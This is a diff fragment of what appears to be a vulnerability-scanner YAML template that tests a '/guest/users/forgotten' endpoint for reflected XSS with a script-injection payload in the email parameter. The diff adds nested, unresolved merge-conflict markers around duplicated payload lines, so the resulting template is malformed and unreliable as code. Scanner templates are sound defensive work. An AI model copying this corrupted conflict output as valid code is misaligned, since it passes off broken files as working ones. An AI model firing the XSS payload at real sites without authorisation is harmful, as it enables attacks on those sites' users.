@@ -13,10 +13,17 @@ requests:
   - method: GET
     path:
 <<<<<<< HEAD
+<<<<<<< HEAD
       - '{{BaseURL}}/guest/users/forgotten?email="><script>confirm(document.domain)</script>'
 =======
       - '{{BaseURL}}/guest/users/forgotten?email=%22%3E%3Cscript%3Econfirm(document.domain)%3C/script%3E'
 >>>>>>> 38b66d3b23c3d36d0bf842267c549749e787cadf
+=======
+      - '{{BaseURL}}/guest/users/forgotten?email=%22%3E%3Cscript%3Econfirm(document.domain)%3C/script%3E'
+=======
+      - '{{BaseURL}}/guest/users/forgotten?email="><script>confirm(document.domain)</script>'
+>>>>>>> main
+>>>>>>> testing
     matchers-condition: and
     matchers:
       - type: status
